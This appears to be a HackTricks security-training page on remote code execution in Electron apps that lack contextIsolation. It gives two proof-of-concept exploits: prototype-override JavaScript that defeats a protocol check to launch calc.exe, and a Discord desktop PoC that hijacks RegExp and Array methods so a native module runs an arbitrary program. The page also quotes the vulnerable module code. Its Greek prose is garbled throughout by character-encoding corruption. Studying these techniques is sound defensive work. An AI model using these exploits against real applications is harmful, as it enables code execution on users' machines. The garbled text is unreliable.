# Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± RCE Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… preload code Ï„Î¿Ï… Electron contextIsolation

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF**, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ ÏƒÏ„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 1

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î±Î½Î¿Î¯Î³ÎµÎ¹ http(s) ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î®:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

ÎšÎ¬Ï„Î¹ ÏƒÎ±Î½ `file:///C:/Windows/systemd32/calc.exe` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼Î¿Î¼Î·Ï‡Î±Î½Î®, Ï„Î¿ `SAFE_PROTOCOLS.indexOf` Ï„Î¿ ÎµÎ¼Ï€Î¿Î´Î¯Î¶ÎµÎ¹.

ÎˆÏ„ÏƒÎ¹, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¹ÏƒÎ±Î³Î¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± JS Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… XSS Î® Ï„Î·Ï‚ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î·Ï‚ Ï€Î»Î¿Î®Î³Î·ÏƒÎ·Ï‚ ÏƒÎµ ÏƒÎµÎ»Î¯Î´Î±:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
ÎšÎ±Î¸ÏÏ‚ Î· ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î·Î½ `SAFE_PROTOCOLS.indexOf` Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï€Î¬Î½Ï„Î± 1337, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®. Î¤ÎµÎ»Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¹Ï‚ Î±ÏÏ‡Î¹ÎºÎ­Ï‚ Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚ Î³Î¹Î± Î¬Î»Î»Î¿Ï…Ï‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î¬Ï„Ï‰Î½ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î¶Î·Ï„ÎµÎ¯Ï„Î±Î¹ Î¬Î´ÎµÎ¹Î±.

Î¦Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Ï†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ± ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ `file://127.0.0.1/electron/rce.jar`

## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 2: RCE ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Discord

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

ÎšÎ±Ï„Î¬ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Ï‰Î½ Ï€ÏÎ¿Ï†Î¿ÏÏ„Ï‰Ï„ÏÎ½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½, Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ± ÏŒÏ„Î¹ Î· Discord Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·, Î· Î¿Ï€Î¿Î¯Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Î¿ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Ï‰Î½ ÎµÎ½Î¿Ï„Î®Ï„Ï‰Î½ Î¼Î­ÏƒÏ‰ `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, ÏƒÏ„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±.\
Î•Î´Ï, Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ‰ ÎµÎ½ÏŒÏ„Î·Ï„ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± RCE Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚, ÏŒÏ€Ï‰Ï‚ Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± _child\_process_, Î±Î»Î»Î¬ **Î²ÏÎ®ÎºÎ± Î­Î½Î±Î½ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ RCE Î¼Îµ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Ï‰Î½ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Ï‰Î½ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ Ï„Î·Ï‚ JavaScript** ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î±ÏÎµÎ¼Î²Î¿Î»Î® ÏƒÏ„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ Î±Ï€Î¿ÎºÎ±Î»Ï…Ï€Ï„ÏŒÎ¼ÎµÎ½Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚.

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ PoC. ÎœÏ€ÏŒÏÎµÏƒÎ± Î½Î± ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÏ‰ ÏŒÏ„Î¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® **calc** ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÏŒÏ„Î±Î½ ÎºÎ±Î»Ï Ï„Î·Î½ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `getGPUDriverVersions`, Î· Î¿Ï€Î¿Î¯Î± Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± "_discord\_utils_", Î±Ï€ÏŒ Ï„Î¿ devTools, ÎµÎ½Ï **Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ `RegExp.prototype.test` ÎºÎ±Î¹ `Array.prototype.join`**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
Î— ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `getGPUDriverVersions` Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· "_execa_", ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
Î£Ï…Î½Î®Î¸Ï‰Ï‚ Ï„Î¿ _execa_ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ "_nvidia-smi.exe_", Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `nvidiaSmiPath`, Ï‰ÏƒÏ„ÏŒÏƒÎ¿, Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ `RegExp.prototype.test` ÎºÎ±Î¹ `Array.prototype.join`, **Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± Î±Î½Ï„Î¹ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÏŒÏÎ¿ "**_**calc**_**" ÏƒÏ„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Ï„Î¿Ï… \_execa**\_**.

Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± Î±Î½Ï„Î¹ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´ÏÎ¿ Î¼Î­ÏÎ·.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î Î‘ÎšÎ•Î¤Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
